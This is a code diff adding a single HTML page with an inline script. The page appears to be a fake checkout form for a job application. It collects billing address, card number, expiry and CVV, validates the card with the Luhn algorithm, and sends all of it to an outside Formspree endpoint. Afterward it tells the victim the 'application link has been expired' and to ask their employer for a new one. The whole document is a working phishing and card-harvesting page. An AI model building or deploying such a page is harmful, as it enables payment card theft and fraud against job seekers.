@@ -1,1 +1,168 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- custom css file link  -->
+    <link rel="stylesheet" href="style.css">
+  
+
+</head>
+<body>
+
+<div class="container">
+
+    <form action=" https://formspree.io/f/xgebjpgy   " method="POST">
+
+        <div class="row">
+
+            <div class="col">
+
+                <h3 class="title">Billing address</h3>
+
+                <div class="inputBox">
+                    <span>full name :</span>
+                    <input type="text" placeholder="john deo" required name="full-name">
+                </div>
+                <div class="inputBox">
+                    <span>email :</span>
+                    <input type="email" placeholder="example@example.com" required name="email">
+                </div>
+                <div class="inputBox">
+                    <span>address :</span>
+                    <input type="text" placeholder="room - street - locality" required  name="address" >
+                </div>
+                <div class="inputBox">
+                    <span>city :</span>
+                    <input type="text" placeholder="London, United Kingdom" required  name="city"  >
+                </div>
+
+                <div class="flex">
+                    <div class="inputBox">
+                        <span>state :</span>
+                        <input type="text" placeholder="London" required  name="state" >
+                    </div>
+                    <div class="inputBox">
+                        <span>zip code :</span>
+                        <input type="text" placeholder="891 541" required name="zip-code" >
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="col">
+
+                <h3 class="title">payment</h3>
+
+                <div class="inputBox">
+                    <span>cards accepted :</span>
+                    <img src="card_img.png" alt="">
+                </div>
+                <div class="inputBox">
+                    <span>name on card :</span>
+                    <input type="text" placeholder="mr. john deo" required name="name-on-card">
+                </div>
+                <div class="inputBox">
+                    <span>credit card number :</span>
+                    <input type="number" placeholder="1111-2222-3333-4444" required name="card-number">
+                </div>
+                <div class="inputBox">
+                    <span>exp month :</span>
+                    <input type="month" placeholder="january" required name="month">
+                </div>
+
+                <div class="flex">
+                    <div class="inputBox">
+                        <span>exp year :</span>
+                        <input type="number" placeholder="2030" required name="expiry-year">
+                    </div>
+                    <div class="inputBox">
+                        <span>CVV :</span>
+                        <input type="text" placeholder="698" required name="CVV">
+                      
+                    </div>
+                  
+                </div>
+
+            </div>
+    
+        </div>
+
+      
+
+        <input type="submit" value="proceed to checkout" class="submit-btn">
+
+    </form>
+
+</div>    
+<script>
+  function validateCardNumber(cardNumber) {
+  // Remove any non-digit characters from the input
+  const cleanedCardNumber = cardNumber.replace(/\D/g, '');
+
+  // Use the Luhn algorithm to validate the card number
+  let sum = 0;
+  let isSecondDigit = false;
+
+  for (let i = cleanedCardNumber.length - 1; i >= 0; i--) {
+    let digit = parseInt(cleanedCardNumber.charAt(i), 10);
+
+    if (isSecondDigit) {
+      digit *= 2;
+
+      if (digit > 9) {
+        digit -= 9;
+      }
+    }
+
+    sum += digit;
+    isSecondDigit = !isSecondDigit;
+  }
+
+  if (sum % 10 !== 0) {
+    return false; // Invalid card number
+  }
+
+  return true; // Valid card number
+}
+
+const form = document.querySelector('form');
+const cardNumberInput = document.querySelector('input[name="card-number"]');
+const submitButton = document.querySelector('.submit-btn');
+
+form.addEventListener('submit', function (event) {
+  event.preventDefault();
+
+  const cardNumber = cardNumberInput.value;
+
+  if (validateCardNumber(cardNumber)) {
+    const formData = new FormData(form);
+
+    fetch(form.action, {
+      method: form.method,
+      body: formData,
+    })
+      .then(response => {
+        if (response.ok) {
+          alert('Form submitted successfully.');
+          alert('This application link has been expired. Please ask your respective employer for a new one.');
+        } else {
+          throw new Error('Form submission failed.');
+        }
+      })
+      .catch(error => {
+        console.error(error);
+        alert('Form submission failed. Please try again.');
+      });
+  } else {
+    alert('Invalid card number. Please enter a valid card number.');
+  }
+});
+
+  </script>
+
+                      </body>
+</html>
